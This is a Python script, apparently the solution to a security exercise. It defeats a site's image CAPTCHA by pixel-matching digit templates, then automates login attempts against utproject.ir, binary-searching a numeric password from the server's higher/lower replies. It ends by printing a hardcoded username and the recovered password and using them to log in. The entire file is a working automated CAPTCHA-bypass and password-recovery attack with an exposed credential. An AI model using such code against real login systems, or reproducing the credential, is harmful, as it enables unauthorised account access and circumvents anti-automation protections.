from PIL import Image
from io import BytesIO
from requests.sessions import Session
import json


session = Session()

def get_number_arrays():
    number_arrays = []
    for number in range(10):
        response = session.get(f"http://utproject.ir/bp/Numbers/{number}.jpg")
        file = BytesIO(response.content)
        image = Image.open(file).convert("L")
        array = image.load()
        number_arrays.append([array[i, j] for i in range(image.size[0]) for j in range(image.size[1])])
    return number_arrays

def decode_captcha(number_arrays):
    response = session.get("http://utproject.ir/bp/image.php")
    captcha_image = Image.open(BytesIO(response.content)).convert("L")
    captcha_digits = []
    for i in range(5):
        digit_pixels = [captcha_image.load()[x, y] for x in range(i*40, (i+1)*40) for y in range(captcha_image.size[1])]
        captcha_digits.append(number_arrays.index(digit_pixels))
    return sum(digit * 10**i for i, digit in enumerate(captcha_digits[::-1]))

def find_password():
    lower_bound = 0
    upper_bound = int(10e20)
    guess = (lower_bound + upper_bound) // 2
    while True:
        captcha = decode_captcha(get_number_arrays())
        response = session.post("http://utproject.ir/bp/login.php", data={"username": 610300087, "password": guess, "captcha": captcha})
        status = json.loads(response.content)["stat"]
        if status == 0:
            print(f"Password found: {guess}")
            break
        elif status == 1:
            upper_bound = guess
        elif status == -1:
            lower_bound = guess
        guess = (lower_bound + upper_bound) // 2

find_password()


print(610300087)
print(68448274311422801972)

def Login():
    post = session.post("http://utproject.ir/bp/login.php", data={"username":610300087,
     "password":68448274311422801972})
    return post.status_code



# 68448274311422801972